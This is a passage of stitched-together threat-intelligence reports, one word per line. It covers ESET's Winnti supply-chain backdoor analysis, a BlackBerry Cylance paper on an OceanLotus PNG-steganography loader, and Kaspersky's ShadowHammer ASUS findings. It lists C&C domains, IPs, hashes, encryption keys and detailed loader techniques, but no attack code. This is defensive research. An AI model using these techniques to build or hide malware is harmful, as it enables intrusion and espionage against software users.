.
 
A
string
identifying
a
campaign
.
 
A
semicolon-separated
list
of
executable
filenames
.
 
If
any
of
them
are
running
,
the
backdoor
stops
its
execution
.
 
ESET
researchers
have
identified
five
versions
of
the
payload
:
Winnti
:
a045939f
2018-07-11
15:45:57
https://bugcheck.xigncodeservice.com/Common/Lib/Common_bsod.php
.
 
Winnti
:
a260dcf1
2018-07-11
15:45:57
https://bugcheck.xigncodeservice.com/Common/Lib/Common_Include.php
.
 
Winnti
:
dde82093
2018-07-11
15:45:57
https://bugcheck.xigncodeservice.com/Common/Lib/common.php
.
 
Winnti
:
44260a1d
2018-08-15
10:59:09
https://dump.gxxservice.com/common/up/up_base.php
.
 
Winnti
:
8272c1f4
2018-11-01
13:16:24
https://nw.infestexe.com/version/last.php
.
 
In
the
first
three
variants
,
the
code
was
not
recompiled
,
but
the
configuration
data
was
edited
in
the
DLL
file
itself
.
 
The
rest
of
the
content
is
a
byte
for
byte
copy
.
 
Domain
names
were
carefully
chosen
to
look
like
they
are
related
to
the
game
or
application
publisher
.
 
The
apex
domain
was
set
to
redirect
to
a
relevant
legitimate
site
using
the
Namecheap
redirection
service
,
while
the
subdomain
points
to
the
malicious
C&C
server
.
 
Winnti
:
xigncodeservice.com
2018-07-10
09:18:17
https://namu.wiki/w/XIGNCODE
.
 
Winnti
:
gxxservice.com
2018-08-14
13:53:41
None
or
unknown
.
 
Winnti
:
infestexe.com
2018-11-07
08:46:44
https://www.facebook.com/infest.in.th
.
 
Winnti
:
bugcheck.xigncodeservice.com
167.99.106.49
,
178.128.180.206
DigitalOcean
.
 
Winnti
:
dump.gxxservice.com
142.93.204.230
DigitalOcean
.
 
Winnti
:
nw.infestexe.com
138.68.14.195
DigitalOcean
.
 
At
the
time
of
writing
,
none
of
the
domains
resolve
and
the
C&C
servers
are
not
responding
.
 
A
bot
identifier
is
generated
from
the
machines
MAC
address
.
 
The
backdoor
reports
information
about
the
machine
such
as
the
user
name
,
computer
name
,
Windows
version
and
system
language
to
the
C&C
server
and
awaits
commands
.
 
The
data
is
XOR
encrypted
with
the
key
*&b0i0rong2Y7un1
and
base64-encoded
.
 
The
data
received
from
the
C&C
server
is
encrypted
using
the
same
key
.
 
This
simple
backdoor
has
only
four
commands
that
can
be
used
by
the
attacker
:
DownUrlFile
DownRunUrlFile
RunUrlBinInMem
UnInstall
.
 
The
commands
are
pretty
much
self-explanatory
.
 
They
allow
the
attacker
to
run
additional
executables
from
a
given
URL
.
 
The
last
one
is
perhaps
less
obvious
.
 
The
UnInstall
command
doesnt
remove
the
malware
from
the
system
.
 
After
all
,
it
is
embedded
inside
a
legitimate
executable
that
still
needs
to
run
.
 
Rather
than
removing
anything
,
it
disables
the
malicious
code
by
setting
the
following
registry
value
to
1:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ImageFlag
.
 
When
the
payload
is
started
,
the
registry
value
is
queried
and
execution
is
aborted
if
set
.
 
Perhaps
the
attackers
are
trying
to
reduce
the
load
from
their
C&C
servers
by
avoiding
callbacks
from
uninteresting
victims
.
 
Based
on
ESET
telemetry
,
one
of
the
second
stage
payload
delivered
to
victims
is
Win64/Winnti.BN
.
 
As
far
as
we
can
tell
,
its
dropper
was
downloaded
over
HTTPS
from
api.goallbandungtravel.com
.
 
We
have
seen
it
installed
as
a
Windows
service
and
as
a
DLL
in
C:\Windows\System32
using
the
following
file
names
:
cscsrv.dll
dwmsvc.dll
iassrv.dll
mprsvc.dll
nlasrv.dll
powfsvc.dll
racsvc.dll
slcsvc.dll
snmpsvc.dll
sspisvc.dll
.
 
The
samples
we
have
analyzed
were
actually
quite
large
,
each
of
them
about
60
MB
.
 
This
is
,
however
,
only
for
appearance
because
the
real
size
or
the
PE
file
is
between
63
KB
and
72
KB
,
depending
on
the
version
.
 
The
malware
files
simply
have
lots
of
clean
files
appended
to
them
.
 
This
is
probably
done
by
the
component
that
drops
and
installs
this
malicious
service
.
 
Once
the
service
runs
,
it
appends
the
extension
.mui
to
its
DLL
path
,
reads
that
file
and
decrypts
it
using
RC5
.
 
The
decrypted
MUI
file
contains
position-independent
code
at
offset
0
.
 
The
RC5
key
is
derived
from
the
hard
drive
serial
number
and
the
string
f@Ukd!rCto
R$.
we
were
not
able
to
obtain
any
MUI
files
nor
the
code
that
installs
them
in
the
first
place
.
 
Thus
,
we
do
not
know
the
exact
purpose
of
this
malicious
service
.
 
Recent
versions
of
the
malware
include
an
auto-update
mechanism
,
using
C&C
server
http://checkin.travelsanignacio.com
.
 
That
C&C
server
served
the
latest
version
of
the
MUI
files
encrypted
with
a
static
RC5
key
.
 
The
C&C
server
was
not
responding
during
our
analysis
.
 
Lets
start
with
who
is
not
targeted
.
 
Early
in
the
payload
,
the
malware
checks
to
see
if
the
system
language
is
Russian
or
Chinese
.
 
In
either
case
,
the
malware
stops
running
.
 
There
is
no
way
around
this
:
the
attackers
are
simply
not
interested
in
computers
configured
with
those
languages
.
 
ESET
telemetry
shows
victims
are
mostly
located
in
Asia
,
with
Thailand
having
the
largest
part
of
the
pie
.
 
Given
the
popularity
of
the
compromised
application
that
is
still
being
distributed
by
its
developer
,
it
wouldnt
be
surprising
if
the
number
of
victims
is
in
the
tens
or
hundreds
of
thousands
.
 
Supply-chain
attacks
are
hard
to
detect
from
the
consumer
perspective
.
 
It
is
impossible
to
start
analyzing
every
piece
of
software
we
run
,
especially
with
all
the
regular
updates
we
are
encouraged
or
required
to
install
.
 
So
,
we
put
our
trust
in
software
vendors
that
the
files
they
distribute
dont
include
malware
.
 
Perhaps
thats
the
reason
multiple
groups
target
software
developers
:
compromising
the
vendor
results
in
a
botnet
as
popular
as
the
software
that
is
hacked
.
 
However
,
there
is
a
downside
of
using
such
a
technique
:
once
the
scheme
is
uncovered
,
the
attacker
loses
control
and
computers
can
be
cleaned
through
regular
updates
.
 
We
do
not
know
the
motives
of
the
attackers
at
this
point
.
 
Is
it
simply
financial
gain?
Are
there
any
reasons
why
the
three
affected
products
are
from
Asian
developers
and
for
the
Asian
market?
Do
these
attackers
use
a
botnet
as
part
of
a
larger
espionage
operation?
ESET
products
detect
this
threat
as
Win32/HackedApp.Winnti.A
,
Win32/HackedApp.Winnti.B
,
the
payload
as
Win32/Winnti.AG
,
and
the
second
stage
as
Win64/Winnti.BN
.
 
Compromised
file
samples
(
Win32/HackedApp.Winnti.A
and
B
)
Winnti
:
7cf41b1acfb05064518a2ad9e4c16fde9185cd4b
Tue
Nov
13
10:12:58
2018
1729131071
8272c1f4
.
 
Winnti
:
7f73def251fcc34cbd6f5ac61822913479124a2a
Wed
Nov
14
03:50:18
2018
19317120
44260a1d
.
 
Winnti
:
dac0bd8972f23c9b5f7f8f06c5d629eac7926269
Tue
Nov
27
03:05:16
2018
1729131071
8272c1f4
.
 
Some
hashes
were
redacted
per
request
from
one
of
the
vendor
.
 
If
for
a
particular
reason
you
need
them
,
reach
out
to
us
at
threatintel@eset.com
.
 
Payload
Samples
(
Win32/Winnti.AG
)
Winnti
:
a045939f53c5ad2c0f7368b082aa7b0bd7b116da
https://bugcheck.xigncodeservice.com/Common/Lib/Common_bsod.php
.
 
Winnti
:
a260dcf193e747cee49ae83568eea6c04bf93cb3
https://bugcheck.xigncodeservice.com/Common/Lib/Common_Include.php
.
 
Winnti
:
dde82093decde6371eb852a5e9a1aa4acf3b56ba
https://bugcheck.xigncodeservice.com/Common/Lib/common.php
.
 
Winnti
:
8272c1f41f7c223316c0d78bd3bd5744e25c2e9f
https://nw.infestexe.com/version/last.php
.
 
Winnti
:
44260a1dfd92922a621124640015160e621f32d5
https://dump.gxxservice.com/common/up/up_base.php
.
 
Second
stage
samples
(
Win64/Winnti.BN
)
Winnti
:
Dropper
delivered
by
api.goallbandungtravel.com
.
 
Winnti
:
4256fa6f6a39add6a1fa10ef1497a74088f12be0
2018-07-25
10:13:41
None
.
 
Winnti
:
bb4ab0d8d05a3404f1f53f152ebd79f4ba4d4d81
2018-10-10
09:57:31
http://checkin.travelsanignacio.com
.
 
Winnti
:
T1195
Supply
Chain
Compromise
.
 
Winnti
:
T1050
New
Service
.
 
Winnti
:
T1022
Data
Encrypted
.
 
Winnti
:
T1079
Multilayer
Encryption
.
 
Winnti
:
T1032
Standard
Cryptographic
Protocol
(
RC4
,
RC5
)
.
 
Winnti
:
T1043
Commonly
Used
Port
(
80
,
443
)
.
 
OceanLotus
Steganography
Malware
Analysis
White
Paper
.
 
While
continuing
to
monitor
activity
of
the
OceanLotus
APT
Group
,
BlackBerry
Cylance
researchers
uncovered
a
novel
payload
loader
that
utilizes
steganography
to
read
an
encrypted
payload
concealed
within
a
.png
image
file
.
 
The
steganography
algorithm
appears
to
be
bespoke
and
utilizes
a
least
significant
bit
approach
to
minimize
visual
differences
when
compared
with
the
original
image
to
prevent
analysis
by
discovery
tools
.
 
Once
decoded
,
decrypted
,
and
executed
,
an
obfuscated
loader
will
load
one
of
the
APT32
backdoors
.
 
Thus
far
,
BlackBerry
Cylance
has
observed
two
backdoors
being
used
in
combination
with
the
steganography
loader
a
version
of
Denes
backdoor
(
bearing
similarities
to
the
one
described
by
ESET
)
,
and
an
updated
version
of
Remy
backdoor
.
 
However
,
this
can
be
easily
modified
by
the
threat
actor
to
deliver
other
malicious
payloads
.
 
The
complexity
of
the
shellcode
and
loaders
shows
the
group
continues
to
invest
heavily
in
development
of
bespoke
tooling
.
 
This
white
paper
describes
the
steganography
algorithm
used
in
two
distinct
loader
variants
and
looks
at
the
launcher
of
the
backdoor
that
was
encoded
in
one
of
the
.png
cover
images
.
 
mcvsocfg.dll
:
ae1b6f50b166024f960ac792697cd688be9288601f423c15abbc755c66b6daa4
Malware/Backdoor
659
KB
(
674
,
816
bytes
)
PE32
executable
for
MS
Windows
(
DLL
)
(
console
)
Intel
80386
32-bit
September
2018
.
 
This
particular
OceanLotus
malware
loader
attempts
to
imitate
McAfee
s
McVsoCfg
DLL
and
expects
to
be
side-loaded
by
the
legitimate
"
On
Demand
Scanner
"
executable
.
 
It
arrives
together
with
an
encrypted
payload
stored
in
a
separate
.png
image
file
.
 
The
.png
cover
file
is
actually
a
valid
image
file
that
is
not
malicious
on
its
own
.
 
The
payload
is
encoded
inside
this
image
with
the
use
of
a
technique
called
steganography
,
which
utilizes
the
least
significant
bits
of
each
pixels
color
code
to
store
hidden
information
,
without
making
overtly
visible
changes
to
the
picture
itself
.
 
The
encoded
payload
is
additionally
encrypted
with
AES128
and
further
obfuscated
with
XOR
in
an
attempt
to
fool
steganography
detection
tools
.
 
Features
:
Side-loaded
DLL
Loads
next-stage
payload
using
custom
.png
steganography
Uses
AES128
implementation
from
Crypto++
library
for
payload
decryption
Known
to
load
Denes
backdoor
,
might
possibly
be
used
also
with
other
payloads
.
 
The
malicious
DLL
exports
the
same
function
names
as
the
original
mcvsocfg.dll
library
.
 
All
exports
contain
the
exact
same
code
which
will
decrypt
the
payload
,
inject
it
into
memory
,
and
execute
it
.
 
The
payload
is
encoded
inside
a
separate
.png
file
using
a
technique
called
steganography
.
 
On
top
of
that
,
the
decoded
payload
is
also
encrypted
with
AES-128
and
finally
obfuscated
with
XOR
0x3B
.
 
Its
worth
noting
that
the
XOR
key
is
not
hardcoded
,
but
instead
is
read
from
the
first
byte
of
the
C:\Windows\system.ini
file
.
 
One
of
the
payloads
we
encountered
was
encoded
inside
an
image
of
Kaito
Kuroba1
,
the
gentleman
thief
character
from
a
popular
Japanese
manga
series
.
 
To
extract
the
payload
,
the
malware
will
first
initialize
the
GDI+
API
and
get
the
image
width
and
height
values
.
 
The
size
of
the
payload
is
encoded
within
the
first
four
pixels
of
the
image
.
 
After
obtaining
the
size
,
the
malware
will
allocate
an
appropriate
memory
buffer
and
proceed
to
decode
the
remaining
payload
byte
by
byte
.
 
The
payload
is
encoded
in
the
same
way
as
the
size
each
byte
of
the
payload
is
computed
from
the
ARGB
color
codes
of
each
subsequent
pixel
in
the
image
.
 
In
case
the
payload
is
bigger
than
the
image
used
to
store
it
,
the
remaining
payload
bytes
are
simply
attached
to
the
image
after
its
IEND
marker
,
and
read
directly
from
the
file
.
 
The
pixel
encoding
algorithm
is
fairly
straightforward
and
aims
to
minimize
visual
differences
when
compared
to
the
original
image
by
only
modifying
the
least
significant
bits
of
the
red
,
green
,
and
blue
color
byte
values
.
 
The
alpha
channel
byte
remains
unchanged
.
 
To
encode
a
byte
of
the
payload
,
the
first
three
bits
(
0-2
)
are
stored
in
the
red
color
,
the
next
three
bits
(
3-5
)
are
stored
in
the
green
color
,
and
the
final
two
bits
(
6-7
)
are
stored
in
the
blue
color
.
 
Decoding
is
a
simple
inverse
operation
.
 
Windows
converts
the
.png
pixel
RGBA
value
to
an
ARGB
encoding
via
the
GdpiBitmapGetPixel
API
.
 
To
aid
in
the
recovery
of
encrypted
payloads
,
the
following
Python
script
can
be
used
to
decode
pixel
colors
from
a
.png
image
.
 
After
decoding
the
.png
image
,
the
loader
then
proceeds
to
initialize
the
key
and
IV
used
to
perform
AES
decryption
of
the
encrypted
payload
.
 
Both
values
are
supplied
from
an
array
of
256
pseudo-random
bytes
hardcoded
in
the
binarys
.rdata
section
.
 
The
first
two
bytes
of
that
array
specify
the
relative
offsets
to
the
key
and
IV
respectively
.
 
The
loader
uses
the
AES128
implementation
from
the
open-source
Crypto++2
library
.
 
We
were
able
to
correlate
most
of
the
disassembly
to
the
corresponding
functions
from
the
Crypto++
github
source
,
and
it
doesnt
appear
that
the
malware
authors
have
modified
much
of
the
original
code
.
 
A
SimpleKeyringInterface
class
is
used
to
initialize
the
key
,
while
the
IV
is
passed
to
the
SetCipherWithIV
function
.
 
The
decryption
is
performed
with
the
use
of
the
StreamTransformationFilter
class
with
the
StreamTransformation
cipher
set
to
AES
CBC
decryption
mode
.
 
The
library
code
performs
numerous
checks
for
the
CPU
features
,
and
based
on
the
outcome
,
it
will
choose
a
processor-specific
implementation
of
the
cryptographic
function
.
 
One
of
the
AES
implementations
makes
use
of
the
Intel
AES-NI
encryption
instruction
set
which
is
supported
by
several
modern
Intel
and
AMD
CPUs
.
 
The
decrypted
payload
undergoes
one
final
transformation
,
where
it
is
XORed
with
the
first
byte
read
from
the
C:\Windows\system
.
 
ini
file
,
which
is
expected
to
begin
with
a
comment
character
"
;
"
(
0x3B
)
.
 
Performing
the
same
steps
in
CyberChef
,
it
is
possible
to
decode
the
encrypted
payload
,
which
should
yield
x86
shellcode
,
starting
with
a
call
immediate
opcode
sequence
.
 
Varies
:
4c02b13441264bf18cc63603b767c3d804a545a60c66ca60512ee59abba28d4d
Malware/Backdoor
658
KB
(
674
,
304
bytes
)
PE32
executable
for
MS
Windows
(
DLL
)
(
console
)
Intel
80386
32-bit
September
2018
.
 
While
this
loader
differs
somewhat
in
general
implementation
,
the
payload
extraction
routine
seems
to
be
the
same
as
in
the
previous
variant
.
 
The
main
differences
are
:
The
way
the
decryption
routine
is
called
(
from
within
the
DllMain
function
,
as
opposed
to
an
exported
function
)
.
 
The
way
the
payload
is
invoked
(
by
overwriting
the
return
address
on
the
stack
,
as
opposed
to
a
direct
call
)
.
 
Implementation
of
an
additional
anti-analysis
check
that
compares
the
name
of
the
parent
process
to
a
string
stored
in
an
encrypted
resource
.
 
We
came
across
multiple
variations
of
this
DLL
containing
different
parent
process
names
,
possibly
targeted
specifically
to
the
victims
environment
.
 
Some
of
these
names
include
processes
related
to
security
software
:
wsc_proxy.exe
plugins-setup.exe
SoftManager.exe
GetEFA.exe
.
 
Features
:
Side-loaded
DLL
Anti-debugging/anti-sandboxing
check
for
parent
process
name
.
 
Loads
next-stage
payload
using
custom
.png
steganography
.
 
Uses
AES128
implementation
from
Crypto++
library
for
payload
decryption
.
 
Executes
the
payload
by
overwriting
the
return
address
on
the
stack
.
 
Known
to
load
an
updated
version
of
Remy
backdoor
.
 
This
DLL
does
not
contain
an
export
table
and
its
entire
functionality
resides
in
the
DllMain
routine
.
 
Upon
execution
,
the
malware
will
first
decrypt
a
string
from
its
resources
and
compare
it
against
the
name
of
the
parent
process
.
 
If
the
names
differ
,
the
malware
will
simply
exit
without
touching
the
payload
.
 
The
resource
containing
the
expected
process
name
(
ICON/1
)
is
XORed
with
the
first
byte
of
the
legitimate
C:\Windows\system.ini
file
0x3B
(
"
;
"
)
.
 
If
the
parent
name
matches
,
the
malware
will
traverse
the
stack
in
order
to
find
a
return
address
that
falls
into
the
memory
of
the
parent
processs
text
section
.
 
Next
,
the
payload
is
read
from
the
.png
cover
file
,
which
seems
to
have
been
taken
from
an
inspirational
quotes
website3
.
 
In
this
instance
,
the
payload
is
fully
contained
within
the
images
pixel
color
codes
,
leaving
no
remaining
data
beyond
the
IEND
marker
.
 
Finally
,
the
loader
will
decrypt
the
payload
to
a
memory
buffer
and
overwrite
the
previously
found
return
address
with
the
pointer
to
that
buffer
,
ensuring
that
the
malicious
shellcode
will
be
executed
when
the
DLL
attempts
to
return
to
the
caller
.
 
The
loader
embedded
in
the
payload
seems
to
be
a
variant
of
the
Veil
"
shellcode_inject
"
payload
,
previously
used
by
OceanLotus
to
load
older
versions
of
Remy
backdoor
.
 
In
this
instance
,
the
shellcode
is
configured
to
load
an
encoded
backdoor
from
within
the
payload
.
 
The
final
payload
comes
in
a
form
of
a
launcher
DLL
that
contains
an
encrypted
backdoor
in
its
.rdata
section
and
a
plain-text
configuration
in
its
resources
.
 
The
resources
also
store
one
or
more
C2
communication
modules
.
 
The
backdoor
DLL
and
the
C2
communication
DLLs
are
heavily
obfuscated
using
high
quantities
of
junk
code
,
which
significantly
inflates
their
size
and
makes
both
static
analysis
and
debugging
more
difficult
.
 
In
addition
to
Denes
and
Remy
backdoors
,
at
least
two
different
communication
modules
were
observed
with
different
versions
of
this
launcher
DNSProvider
and
HTTPProv
.
 
The
launcher
binary
,
which
contains
the
final
backdoor
,
is
RC4
encrypted
and
wrapped
in
a
layer
of
obfuscated
shellcode
.
 
We
can
see
the
familiar
DOS
stub
in
plain
text
,
but
the
rest
of
the
header
and
binary
body
are
encrypted
.
 
The
shellcode
is
obfuscated
using
OceanLotus
s
standard
approach
of
flattening
the
control
flow
and
inserting
junk
opcodes
(
as
described
in
the
ESET
white
paper
on
OceanLotus
)
.
 
The
shellcode
starts
in
a
fairly
standard
way
by
walking
the
list
of
loaded
modules
in
order
to
find
the
base
of
kernel32.dll
library
.
 
Once
kernel32
base
is
found
,
the
shellcode
will
calculate
the
addresses
of
LoadLibraryA
and
GetProcAddress
functions
,
and
use
them
to
resolve
other
necessary
APIs
,
which
include
VirtualAlloc
,
RtlMoveMemory
,
and
RtlZeroMemory
.
 
After
resolving
the
APIs
,
the
shellcode
will
decrypt
the
launcher
binary
and
load
it
to
the
memory
.
 
MZ
header
,
PE
header
,
as
well
as
each
section
and
their
header
,
are
decrypted
separately
using
RC4
algorithm
and
a
hardcoded
key
.
 
Once
all
sections
are
loaded
,
the
relocations
get
fixed
and
the
MZ/PE
headers
are
zeroed
out
in
memory
.
 
The
shellcode
then
proceeds
to
execute
the
payload
DLLs
entry
point
.
 
The
Internal
name
of
this
DLL
is
a
randomly
looking
CLSID
and
it
only
exports
one
function
called
DllEntry
.
 
Upon
execution
,
the
launcher
will
attempt
to
hook
legitimate
wininet.dll
library
by
overwriting
its
entry
point
in
memory
with
the
address
of
a
malicious
routine
.
 
If
successful
,
every
time
the
system
loads
wininet.dll
,
the
entry
point
of
the
subsequently
dropped
backdoor
DLL
will
be
executed
before
the
original
wininet
entry
point
.
 
There
is
no
proper
DLL
injection
routine
the
payload
is
just
decompressed
to
the
memory
as-is
so
the
malware
needs
to
fix
all
the
pointers
in
the
decompressed
code
,
which
is
done
on
a
one-by-one
basis
using
hardcoded
values
and
offsets
.
 
This
part
takes
90%
of
the
whole
launcher
code
and
includes
over
11
,
000
modifications
.
 
The
launcher
then
calls
the
backdoor
DLLs
entry
point
.
 
The
routine
that
reads
configuration
from
resources
and
decompresses
the
C2
communication
library
is
then
called
by
temporarily
replacing
the
pointer
to
CComCriticalSection
function
with
the
pointer
to
that
routine
.
 
Such
an
obfuscation
method
makes
it
difficult
to
spot
it
in
the
code
.
 
The
launcher
loads
configuration
from
resources
and
uses
an
export
from
the
backdoor
DLL
to
initialize
config
values
in
memory
.
 
Resource
P1/1
contains
config
values
,
including
port
number
and
a
registry
path
.
 
After
the
content
of
resource
0xC8
is
decompressed
,
another
function
from
the
backdoor
DLL
is
used
to
load
the
C2
communication
module
to
the
memory
and
call
its
"
CreateInstance
"
export
.
 
Finally
,
the
launcher
passes
control
to
the
main
backdoor
routine
.
 
OceanLotus
:
0
4
name
is
read
from
resource
P1/0x64
.
 
OceanLotus
:
{12C044FA-A4AB-433B-88A2-32C3451476CE}
memory
pointer
4
points
to
a
function
that
spawns
another
copy
of
malicious
process
.
 
OceanLotus
:
{9E3BD021-B5AD-49DEAE93-F178329EE0FE}
C&C
URLs
varies
content
is
read
from
resource
P1/2
.
 
OceanLotus
:
0
config
varies
content
is
read
from
resource
P1/1
.
 
OceanLotus
:
{B578B063-93FB-4A5F-82B4-4E6C5EBD393B}
?
4
0
(
config+0x486
)
.
 
OceanLotus
:
{5035383A-F7B0-424A-9C9A-CA667416BA6F}
port
number
4
0x1BB
(
443
)
(
config+0x46C
)
.
 
OceanLotus
:
{68DDB1F1-E31F-42A9-A35D-984B99ECBAAD}
registry
path
varies
SOFTWARE\Classes\CLSID\{57C3E2E2-C18F-4ABF-BAAA-9D17879AB029}
.
 
The
backdoor
DLL
is
stored
in
the
.rdata
section
of
the
launcher
,
compressed
with
LZMA
,
and
encrypted
with
RC4
.
 
The
binary
is
heavily
obfuscated
with
overlapping
blocks
of
garbage
code
enclosed
in
pushf/popf
instructions
.
 
The
DllMain
function
replaces
the
pointer
to
GetModuleHandleA
API
with
a
pointer
to
hook
routine
that
will
return
the
base
of
the
backdoor
DLL
when
called
with
NULL
as
parameter
(
instead
of
returing
the
handle
to
the
launcher
DLL
)
.
 
The
backdoor
also
contains
an
export
that
loads
the
C2
communication
module
reflectively
to
the
memory
from
resource
passed
as
parameter
and
then
calls
its
"
CreateInstance
"
export
.
 
While
we
are
still
in
the
process
of
analyzing
this
backdoors
full
functionality
,
it
seems
to
be
similar
to
the
Remy
backdoor
described
in
our
previous
whitepaper
on
OceanLotus
malware
.
 
This
DLL
is
stored
in
the
launchers
resources
and
compressed
with
LZMA
.
 
Its
also
heavily
obfuscated
,
but
in
a
slightly
different
way
than
the
backdoor
.
 
Although
it
doesnt
contain
an
internal
name
,
we
believe
its
a
variant
of
HttpProv
library
,
as
described
in
the
ESET
white
paper
on
OceanLotus
.
 
This
module
is
used
by
the
backdoor
during
HTTP/HTTPS
communication
with
the
C2
server
and
has
a
proxy
bypass
functionality
.
 
OceanLotus
:
ae1b6f50b166024f960ac792697cd688be9288601f423c15abbc755c66b6daa4
Loader
#1
.
 
OceanLotus
:
0ee693e714be91fd947954daee85d2cd8d3602e9d8a840d520a2b17f7c80d999
Loader
#1
.
 
OceanLotus
:
a2719f203c3e8dcdcc714dd3c1b60a4cbb5f7d7296dbb88b2a756d85bf0e9c1e
Loader
#1
.
 
OceanLotus
:
4c02b13441264bf18cc63603b767c3d804a545a60c66ca60512ee59abba28d4d
Loader
#2
.
 
OceanLotus
:
e0fc83e57fbbb81cbd07444a61e56e0400f7c54f80242289779853e38beb341e
Loader
#2
.
 
OceanLotus
:
cd67415dd634fd202fa1f05aa26233c74dc85332f70e11469e02b370f3943b1d
Loader
#2
.
 
OceanLotus
:
9112f23e15fdcf14a58afa424d527f124a4170f57bd7411c82a8cdc716f6e934
Loader
#2
.
 
OceanLotus
:
ecaeb1b321472f89b6b3c5fb87ec3df3d43a10894d18b575d98287b81363626f
Loader
#2
.
 
OceanLotus
:
478cc5faadd99051a5ab48012c494a807c7782132ba4f33b9ad9229a696f6382
Loader
#2
.
 
OceanLotus
:
72441fe221c6a25b3792d18f491c68254e965b0401a845829a292a1d70b2e49a
Payload
PNG
(
loader
#1
)
.
 
OceanLotus
:
11b4c284b3c8b12e83da0b85f59a589e8e46894fa749b847873ed6bab2029c0f
Payload
PNG
(
loader
#2
)
.
 
OceanLotus
:
d78a83e9bf4511c33eaab9a33ebf7ccc16e104301a7567dd77ac3294474efced
Payload
PNG
(
loader
#2
)
.
 
OceanLotus
:
E:\ProjectGit\SHELL\BrokenSheild\BrokenShieldPrj\Bin\x86\Release\DllExportx86.pdb
Loader
#1
.
 
OceanLotus
:
C:\Users\Meister\Documents\Projects\BrokenShield\Bin\x86\Release\BrokenShield.pdb
Loader
#2
.
 
OceanLotus
:
kermacrescen.com
7244
.
 
OceanLotus
:
stellefaff.com
7244
.
 
OceanLotus
:
manongrover.com
7244
.
 
OceanLotus
:
background.ristians.com:8888
11b4
.
 
OceanLotus
:
enum.arkoorr.com:8531
11b4
.
 
OceanLotus
:
worker.baraeme.com:8888
11b4
.
 
OceanLotus
:
enum.arkoorr.com:8888
11b4
.
 
OceanLotus
:
worker.baraeme.com:8531
11b4
.
 
OceanLotus
:
plan.evillese.com:8531
11b4
.
 
OceanLotus
:
background.ristians.com:8531
11b4
.
 
OceanLotus
:
plan.evillese.com:8888
11b4
.
 
OceanLotus
:
SOFTWARE\Classes\CLSID\{E3517E26-8E93-458D-A6DF-8030BC80528B}
7244
.
 
OceanLotus
:
SOFTWARE\App\AppX06c7130ad61f4f60b50394b8cba3d35f\Applicationz
7244
.
 
OceanLotus
:
SOFTWARE\Classes\CLSID\{57C3E2E2-C18F-4ABF-BAAA-9D17879AB029}
11b4
.
 
Operation
ShadowHammer
.
 
Earlier
today
,
Motherboard
published
a
story
by
Kim
Zetter
on
Operation
ShadowHammer
,
a
newly
discovered
supply
chain
attack
that
leveraged
ASUS
Live
Update
software
.
 
While
the
investigation
is
still
in
progress
and
full
results
and
technical
paper
will
be
published
during
SAS
2019
conference
in
Singapore
,
we
would
like
to
share
some
important
details
about
the
attack
.
 
In
January
2019
,
we
discovered
a
sophisticated
supply
chain
attack
involving
the
ASUS
Live
Update
Utility
.
 
The
attack
took
place
between
June
and
November
2018
and
according
to
our
telemetry
,
it
affected
a
large
number
of
users
.
 
ASUS
Live
Update
is
an
utility
that
is
pre-installed
on
most
ASUS
computers
and
is
used
to
automatically
update
certain
components
such
as
BIOS
,
UEFI
,
drivers
and
applications
.
 
According
to
Gartner
,
ASUS
is
the
worlds
5th-largest
PC
vendor
by
2017
unit
sales
.
 
This
makes
it
an
extremely
attractive
target
for
APT
groups
that
might
want
to
take
advantage
of
their
userbase
.
 
Based
on
our
statistics
,
over
57
,
000
Kaspersky
users
have
downloaded
and
installed
the
backdoored
version
of
ASUS
Live
Update
at
some
point
in
time
.
 
We
are
not
able
to
calculate
the
total
count
of
affected
users
based
only
on
our
data
;
however
,
we
estimate
that
the
real
scale
of
the
problem
is
much
bigger
and
is
possibly
affecting
over
a
million
users
worldwide
.
 
The
goal
of
the
attack
was
to
surgically
target
an
unknown
pool
of
users
,
which
were
identified
by
their
network
adapters
MAC
addresses
.
 
To
achieve
this
,
the
attackers
had
hardcoded
a
list
of
MAC
addresses
in
the
trojanized
samples
and
this
list
was
used
to
identify
the
actual
intended
targets
of
this
massive
operation
.
 
We
were
able
to
extract
more
than
600
unique
MAC
addresses
from
over
200
samples
used
in
this
attack
.
 
Of
course
,
there
might
be
other
samples
out
there
with
different
MAC
addresses
in
their
list
.
 
We
believe
this
to
be
a
very
sophisticated
supply
chain
attack
,
which
matches
or
even
surpasses
the
Shadowpad
and
the
CCleaner
incidents
in
complexity
and
techniques
.
 
The
reason
that
it
stayed
undetected
for
so
long
is
partly
due
to
the
fact
that
the
trojanized
updaters
were
signed
with
legitimate
certificates
(
eg
:
ASUSTeK
Computer
Inc.
)
.
 
The
malicious
updaters
were
hosted
on
the
official
liveupdate01s.asus.com
and
liveupdate01.asus.com
ASUS
update
servers
.
 
We
have
contacted
ASUS
and
informed
them
about
the
attack
on
Jan
31
,
2019
,
supporting
their
investigation
with
IOCs
and
descriptions
of
the
malware
.
 
Although
precise
attribution
is
not
available
at
the
moment
,
certain
evidence
we
have
collected
allows
us
to
link
this
attack
to
the
ShadowPad
incident
from
2017
.
 
The
actor
behind
the
ShadowPad
incident
has
been
publicly
identified
by
Microsoft
in
court
documents
as
BARIUM
.
 
BARIUM
is
an
APT
actor
known
to
be
using
the
Winnti
backdoor
.
 
Recently
,
our
colleagues
from
ESET
wrote
about
another
supply
chain
attack
in
which
BARIUM
was
also
involved
,
that
we
believe
is
connected
to
this
case
as
well
.
 
It
should
be
noted
that
the
numbers
are
also
highly
influenced
by
the
distribution
of
Kaspersky
users
around
the
world
.
 
In
principle
,
the
distribution
of
victims
should
match
the
distribution
of
ASUS
users
around
the
world
.
 
Weve
also
created
a
tool
which
can
be
run
to
determine
if
your
computer
has
been
one
of
the
surgically
selected
targets
of
this
attack
.
 
To
check
this
,
it
compares
MAC
addresses
of
all
adapters
to
a
list
of
predefined
values
hardcoded
in
the
malware
and
alerts
if
a
match
was
found
.
 
Download
an
archive
with
the
tool
(
.exe
)
.
 
Also
,
you
may
check
MAC
addresses
online
.
 
If
you
discover
that
you
have
been
targeted
by
this
operation
,
please
e-mail
us
at
:
shadowhammer@kaspersky.com
.
 
Kaspersky
Lab
verdicts
for
the
malware
used
in
this
and
related
attacks
.
 
ShadowHammer
:
HEUR
:
Trojan.Win32.ShadowHammer.gen
.
 
ShadowHammer
:
asushotfix.com
.
 
ShadowHammer
:
141.105.71.116
.
 
ShadowHammer
:
http://liveupdate01.asus.com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER365.zip
.
 
ShadowHammer
:
https://liveupdate01s.asus.com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER362.zip
.
 
ShadowHammer
:
